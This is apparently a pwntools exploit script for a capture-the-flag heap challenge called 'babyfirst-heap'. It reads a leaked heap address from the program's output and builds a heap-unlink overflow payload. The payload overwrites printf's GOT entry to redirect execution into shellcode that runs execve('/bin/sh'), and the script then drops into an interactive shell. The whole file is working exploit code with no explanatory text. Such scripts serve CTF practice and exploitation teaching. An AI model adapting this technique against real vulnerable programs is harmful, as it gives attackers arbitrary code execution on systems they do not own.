#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfirst-heap")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    #gdb.attach(r)
    [r.recvuntil("[ALLOC][loc=") for i in range(11)]
    heap = int(r.recvn(7), 16)
    print hex(heap)
    
    shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
    shellcode_address = heap + 8
    
    fd = exe.got['printf'] - 8
    bk = shellcode_address
    
    payload = p32(fd) + p32(bk) + shellcode
    payload += "A"*(264-0x10-len(shellcode))
    payload += p32(0)*2  
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()